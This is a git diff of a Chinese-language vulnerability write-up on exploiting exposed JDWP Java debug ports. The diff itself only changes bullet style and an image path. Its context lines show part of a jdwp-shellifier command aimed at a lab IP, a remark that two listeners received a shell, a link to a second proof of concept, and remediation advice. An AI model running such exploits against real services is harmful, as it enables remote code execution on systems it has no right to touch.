@@ -8,7 +8,7 @@ JDWP 是 JVM 或者类 JVM 的虚拟机都支持的一种协议，通过该协�
 
 参考阅读：
 
-- https://forum.butian.net/share/1232
+* https://forum.butian.net/share/1232
 
 ## 环境搭建
 
@@ -147,7 +147,7 @@ python2 jdwp-shellifier.py -t 192.168.178.128 -p 8000 --break-on "java.lang.Stri
 
 两个监听都收到 shell，一个输入命令，一个输出结果。
 
-![image-20230630173638801](images/image-20230630173638801.png)
+![image-20230630173638801](../.gitbook/assets/image-20230630173638801.png)
 
 ### POC2
 
@@ -157,5 +157,5 @@ poc2：https://github.com/Lz1y/jdwp-shellifier
 
 ## 修复建议
 
-- 关闭 JDWP 端口，或者 JDWP 端口不对公网开放
-- 关闭 Java 的 debug 模式
+* 关闭 JDWP 端口，或者 JDWP 端口不对公网开放
+* 关闭 Java 的 debug 模式
